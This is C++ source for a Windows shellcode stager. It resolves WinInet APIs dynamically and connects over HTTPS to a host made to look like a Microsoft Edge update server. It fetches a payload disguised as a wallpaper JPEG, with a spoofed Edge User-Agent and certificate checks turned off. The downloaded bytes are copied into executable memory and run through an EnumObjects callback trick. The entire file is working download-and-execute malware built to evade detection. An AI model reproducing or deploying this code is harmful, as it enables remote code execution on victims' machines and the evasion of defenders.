#include "sc4.h"
#include <WinInet.h>

// clang-format off
SC_MAIN_BEGIN()
{
	// clang-format on
	SC_IMPORT_API_BATCH_BEGIN();
	SC_IMPORT_API_BATCH("User32.dll", GetDC);
	SC_IMPORT_API_BATCH("Gdi32.dll", EnumObjects);
	SC_IMPORT_API_BATCH("kernel32.dll", VirtualAlloc);
	SC_IMPORT_API_BATCH("wininet.dll", InternetOpenA);
	SC_IMPORT_API_BATCH("wininet.dll", InternetConnectA);
	SC_IMPORT_API_BATCH("wininet.dll", HttpOpenRequestA);
	SC_IMPORT_API_BATCH("wininet.dll", InternetSetOptionA);
	SC_IMPORT_API_BATCH("wininet.dll", HttpSendRequestA);
	SC_IMPORT_API_BATCH("wininet.dll", HttpQueryInfoA);
	SC_IMPORT_API_BATCH("wininet.dll", InternetReadFile);
	SC_IMPORT_API_BATCH_END();


	auto hInternet = InternetOpenA(0, 0, 0, 0, 0);
	auto session = InternetConnectA(hInternet, SC_PISTRINGA("update.edgeupdatem.services"), 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);


	auto req = HttpOpenRequestA(session, NULL, SC_PISTRINGA("/th/OHR.HippieTown_JA-JP7135616554_1820x1080.jpg"), NULL, NULL, NULL, 0x84C03200, NULL);

	int flag = 0x3380;
	InternetSetOptionA(req, INTERNET_OPTION_SECURITY_FLAGS, &flag, 4);

	HttpSendRequestA(req, SC_PISTRINGA("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/apng,*/*;q=0.8\r\nHost: update.edgeupdatem.services\r\naccept-language: q=0.7,en-US;q=0.6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62\r\n"), -1, NULL, NULL);

	DWORD content_length = 0;
	DWORD content_length_size = sizeof(DWORD);
	HttpQueryInfoA(req, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &content_length, &content_length_size, NULL);

	auto shellcode = VirtualAlloc(nullptr, content_length + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	DWORD dwRead = 0;
	InternetReadFile(req, shellcode, content_length + 1, &dwRead);
	shellcode = (char*)shellcode + 0xa2;
	auto dc = GetDC(NULL);

	EnumObjects(dc, OBJ_BRUSH, (GOBJENUMPROC)shellcode, NULL);

	// clang-format off
}
SC_MAIN_END()
// clang-format on
